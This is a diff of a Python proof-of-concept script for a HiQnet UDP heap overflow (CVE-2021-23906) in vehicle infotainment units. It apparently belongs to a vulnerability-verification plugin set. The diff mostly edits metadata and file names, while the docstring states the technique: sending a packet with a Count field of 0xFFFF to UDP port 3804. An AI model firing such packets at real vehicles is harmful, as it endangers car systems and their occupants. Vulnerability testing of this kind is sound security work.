@@ -1,13 +1,13 @@
 """
 PoC Name: HiQnet UDP Heap Overflow
 CVE: CVE-2021-23906
-Component: Infotainment App (HiQnet Audio Protocol)
-Category: IVI System
+Component: Application Stack
+Category: Application
 Severity: Critical
 CVSS: 9.8
-Description: 向暴露的 HiQnet UDP 端口(3804)发送具有畸形 Count 字段(0xFFFF)的恶意数据包，触发分配巨大的堆内存引发溢出。
+Description: UDP数据包恶意count字段(0xFFFF)触发堆溢出
 Prerequisites: 目标车机运行存在漏洞的 HiQnet 音频发现服务且未配置防火墙。
-Usage: python3 48_HiQnet_Heap_Overflow_UDP.py <target_ip>
+Usage: python3 52_HiQnet_Heap_Overflow_UDP.py <target_ip>
 """
 import sys
 import socket
@@ -63,9 +63,9 @@ class HiQnetUDPOKPlugin(IVIVulnerabilityPlugin):
         finally:
             sock.close()
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     if len(sys.argv) < 2:
-        print("Usage: python3 48_HiQnet_Heap_Overflow_UDP.py <target_ip>")
+        print("Usage: python3 52_HiQnet_Heap_Overflow_UDP.py <target_ip>")
         sys.exit(1)
     plugin = HiQnetUDPOKPlugin({"target_ip": sys.argv[1]})
     plugin.run_verify()
